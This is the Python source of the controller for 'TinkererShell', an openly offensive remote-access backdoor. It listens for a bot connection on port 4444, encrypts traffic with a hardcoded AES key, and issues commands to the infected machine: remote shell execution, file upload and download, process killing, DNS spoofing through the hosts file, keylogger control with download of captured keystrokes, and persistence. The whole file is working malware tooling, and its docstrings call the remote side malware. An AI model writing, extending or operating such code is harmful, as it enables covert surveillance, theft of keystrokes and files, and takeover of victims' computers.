#!/usr/bin/python
# -*- coding: utf-8 -*-
"""TinkererShell client, a simple client to control bots.\n"""

# Written By Ananke: https://github.com/4n4nk3
from socket import *
import os
import time
import base64
import cmd
import datetime
# pycrypto
from Crypto.Cipher import AES

# Global variables
global conn
global cipher
global EncodeAES
global DecodeAES


# Logging function
def logging(data_to_log: str, printer=False) -> bool:
    """Log data passed as argument and if needed print it also to the console.\n"""
    if printer is True:
        print(data_to_log)
    try:
        log_descriptor = open('sessionlog.txt', 'a')
        log_descriptor.write('\n' + datetime.datetime.now().strftime("%Y-%m-%d %H:%M") + '\n' + data_to_log)
        log_descriptor.close()
    except Exception as exception:
        print(exception)
    return True


def sender(data_to_send: str) -> bool:
    """Send a string to the connected bot. Make sure string is not empty in order to prevent reception exceptions.\n"""
    if len(data_to_send) == 0:
        data_to_send = 'Ok (no output)'
    # Encrypt data
    encrypted = EncodeAES(cipher, data_to_send)
    # Send encrypted data's length encrypted
    conn.send(EncodeAES(cipher, str(len(encrypted))))
    # Sleep 1 second to let the receiver decrypt the length packet.
    time.sleep(1)
    # Send encrypted data
    conn.send(encrypted)
    return True


def receiver(printer=False) -> str:
    """Receive encrypted data and return clear-text string.\n"""
    lengthcrypt = conn.recv(1024)
    expected_length = int(DecodeAES(cipher, lengthcrypt))
    encrypted_received_data: str = ''
    while len(encrypted_received_data) < expected_length:
        encrypted_received_data += conn.recv(1024).decode('utf-8')
    clear_text = DecodeAES(cipher, encrypted_received_data)
    if printer is True:
        logging(data_to_log=clear_text, printer=True)
    return clear_text


def ask_input(phrase: object = False, send: bool = False) -> str:
    """Ask for user input with custom phrase or default to >>>. If needed send input to connected bot.\n"""
    if phrase:
        user_input = input(phrase)
        logging(data_to_log=(''.join((phrase, user_input))))
        if send is True:
            sender(user_input)
    else:
        user_input = input('>>> ')
        logging(data_to_log=('>>> ' + user_input))
        if send is True:
            sender(user_input)
    return user_input


def downloader() -> bool:
    """Download a file from the bot.\n"""
    sender('SHdownload')
    # File to be downloaded
    receiver(printer=True)
    ask_input(send=True)
    received_file_data = receiver()
    # Local filename to save downloaded file
    local_filename = ask_input(phrase='Insert name wich you want to use to save the file\t\texample.txt\n\n >>> ')
    # sender(a)
    if received_file_data != 'reachedexcept':
        try:
            downloaded_file_descriptor = open(local_filename, 'wb')
            downloaded_file_descriptor.write(bytes(received_file_data))
            downloaded_file_descriptor.close()
            logging(data_to_log=('File saved in ' + os.getcwd() + '\n'), printer=True)
        except Exception as exception:
            logging(data_to_log=str(exception), printer=True)
    else:
        remote_exception = receiver()
        logging(
            data_to_log='Operation aborted (received <reachedexcept> string from bot)\nDetails: ' + remote_exception,
            printer=True)
    return True


def uploader() -> bool:
    """Upload a file to the bot.\n"""
    sender('SHupload')
    file_to_upload = ask_input(phrase=('Insert the name of the file that you want to upload\t\t' + os.path.normcase(
        'C:/boot.ini') + '\n\n >>> '))
    ask_input(phrase='Insert name wich you want to use to save the file\t\tC:\\boot.ini\n\n >>> ', send=True)
    try:
        upload_descriptor = open(file_to_upload, 'rb')
        file_data = upload_descriptor.read()
        upload_descriptor.close()
    except Exception as exception:
        logging(data_to_log=str(exception), printer=True)
        file_data = 'reachedexcept'
    sender(file_data)
    receiver(printer=True)
    return True


def processkiller():
    """Kill a process.\n"""
    sender('SHprocesskill')
    receiver(printer=True)
    ask_input(send=True)
    receiver(printer=True)


def dnsspoofer():
    """Start DNS spoofing via 'hosts' file.\n"""
    sender('SHdnstart')
    receiver(printer=True)
    ask_input(send=True)
    receiver(printer=True)
    ask_input(send=True)
    receiver(printer=True)


def keylogdownloader():
    """Download keystrokes logged by keylogger.\n"""
    sender('SHkeylogdownload')
    keylogged_data = receiver()
    if keylogged_data == 'reachedexcept':
        receiver(printer=True)
    else:
        try:
            keylogged_descriptor = open('keylogged.txt', 'a')
            keylogged_descriptor.write(keylogged_data)
            keylogged_descriptor.close()
            logging(data_to_log='Download compleated!\n Use <SHkeylog show> to see keylogged data\n', printer=True)
        except Exception as exception:
            logging(data_to_log=str(exception), printer=True)


def keylogshower():
    """Show downloaded keystrokes in a tk window.\n"""
    try:
        keylogged_descriptor = open('keylogged.txt', 'r')
        print(keylogged_descriptor.read())
        keylogged_descriptor.close()
    except Exception as exception:
        logging(data_to_log=str(exception), printer=True)


def quit_utility() -> bool:
    """Quit and terminate remote backdoor thread. If mailactivation thread is not running the malware gonna kill himself.\n"""
    double_check = ask_input(phrase='Are you sure? yes/no\n')
    if double_check == 'yes':
        sender('SHquit')
        response = receiver()
        if response == 'mistochiudendo':
            return True
        else:
            logging(data_to_log=response, printer=True)
            return False
    else:
        logging(data_to_log='Operation aborted\n', printer=True)
        return False


def command_executer():
    CommandExecuterInput().cmdloop()


# =================================================================================================

class CommandExecuterInput(cmd.Cmd):
    """Command Executer Input handler.\n"""

    prompt = '\n  >>> '

    def do_SHreturn(self, option):
        """SHreturn\n\tReturn to TinkererShell interactive mode.\n"""
        logging(data_to_log='Returning to TinkererShell interactive mode...\n', printer=True)
        return True

    def default(self, command):
        sender(command)
        response = receiver()
        if response == 'reachedexcept':
            receiver(printer=True)
        else:
            logging(data_to_log=response, printer=True)

    # =============================================================================================
    def precmd(self, line):
        logging(data_to_log=('\n  >>> ' + line))
        return cmd.Cmd.precmd(self, line)


# =================================================================================================
class TinkererShellInput(cmd.Cmd):
    """TinkererShell.\n"""

    prompt = '\n(SHCmd) '

    def do_SHprocess(self, option):
        """SHprocesses [option]\n\tlist: List active processes\n\tkill: Kill an active process\n"""
        if option:
            if option == 'list':
                sender('SHprocesslist')
                receiver(printer=True)
            elif option == 'kill':
                processkiller()
            else:
                print('Aborted: unknown option\n')
        else:
            print('Aborted: an option is required\n')

    # ---------------------------------------------------------------------------------------------
    def do_SHdns(self, option):
        """SHdns [option]\n\tstart: Start DNS spoofing\n\tstop: Stop DNS spoofing\n"""
        if option:
            if option == 'start':
                dnsspoofer()
            elif option == 'stop':
                sender('SHdnsstop')
                receiver(printer=True)
            else:
                print('Aborted: unknown option\n')
        else:
            print('Aborted: an option is required\n')

    # ---------------------------------------------------------------------------------------------
    def do_SHkeylog(self, option):
        """SHkeylog [option]\n\tstatus: Show status of the keylogger\n\tstart: Start keylogger\n\tstop: Stop keylogger\n\tdownload: Download keylogged data to local machine and delete it from remote bot\n\tshow: Show downloaded keylogged data\n"""
        if option:
            if option == 'status':
                sender('SHkeylogstatus')
                receiver(printer=True)
            elif option == 'start':
                sender('SHkeylogstart')
                receiver(printer=True)
            elif option == 'stop':
                sender('SHkeylogstop')
                receiver(printer=True)
            elif option == 'download':
                keylogdownloader()
            elif option == 'show':
                keylogshower()
            else:
                print('Aborted: unknown option\n')
        else:
            print('Aborted: an option is required\n')

    # ---------------------------------------------------------------------------------------------
    def do_SHdownload(self, option):
        """SHdownload\n\tDownload a file\n"""
        downloader()

    # ---------------------------------------------------------------------------------------------
    def do_SHupload(self, option):
        """SHupload\n\tUpload a file\n"""
        uploader()

    # ---------------------------------------------------------------------------------------------
    def do_SHexec(self, option):
        """SHexec\n\tUse remote system command shell\n"""
        command_executer()

    # ---------------------------------------------------------------------------------------------
    def do_SHpersistence(self, option):
        """"SHpersistence [option]\n\tstatus: Show status of the persistence module\n\tenable: Enable persistence installation\n\tdisable: Disable persistence installation\n"""
        if option == 'enable':
            sender('SHpersistenceenable')
            receiver(printer=True)
        elif option == 'disable':
            sender('SHpersistencedisable')
            receiver(printer=True)
        elif option == 'status':
            sender('SHpersistencestatus')
            receiver(printer=True)
        else:
            print('Aborted: unknown option\n')

    # ---------------------------------------------------------------------------------------------
    def do_SHquit(self, option) -> bool:
        """SHquit\n\tQuit and close the connection\n"""
        if quit_utility() is True:
            return True
        else:
            return False

    def emptyline(self):
        pass

    # =============================================================================================
    def precmd(self, line):
        logging(data_to_log=('\n(Cmd) ' + line))
        return cmd.Cmd.precmd(self, line)

    # =============================================================================================
    def postloop(self):
        # Chiudo il socket
        conn.close()
        logging(data_to_log='\nDisconnected!', printer=True)


# =============================================================================================#=============================================================================================
if __name__ == '__main__':
    """Main function.\n"""

    # Setup sessionlog.txt file where I am gonna log all console output
    if os.path.isfile('sessionlog.txt') and not os.access('sessionlog.txt', os.W_OK):
        chiusura = input(
            '[-] sessionlog.txt access to log file denied.\nTry running this program as root... Press Enter to '
            'exit...')
        exit(0)
    try:
        f = open('sessionlog.txt', 'a')
        f.write(
            '\n\n\n\n\n' + datetime.datetime.now().strftime("%Y-%m-%d %H:%M") + '\n[*] Start of session\'s logs [*]\n')
        f.close()
    except Exception as exception:
        print(exception)

    # Interface and port
    HOST = ''
    PORT = 4444

    # Socket definition
    s = socket(AF_INET, SOCK_STREAM)
    s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
    s.bind((HOST, PORT))
    logging(data_to_log='\nWelcome in TinkererShell!\nWritten By Tinkerer: https://github.com/4n4nk3\n', printer=True)
    logging(data_to_log=('Listening on 0.0.0.0:%s...' % str(PORT)), printer=True)

    # Listening...
    s.listen(10)
    conn, addr = s.accept()
    a = conn.recv(1024).decode('utf-8')
    logging(data_to_log=('Connection estabilished with: ' + str(addr)), printer=True)
    logging(data_to_log=a, printer=True)

    # Cryptography
    BLOCK_SIZE = 32
    PADDING = '{'
    pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
    EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
    DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).decode('utf-8').rstrip(PADDING)
    # Super secret password
    secret = '4n4nk353hlli5w311d0n3andI1ik3it!'
    cipher = AES.new(secret)
    del secret
    decryptato = ''

    # Start command loop
    TinkererShellInput().cmdloop()

# TODO: Add support for multiple bots
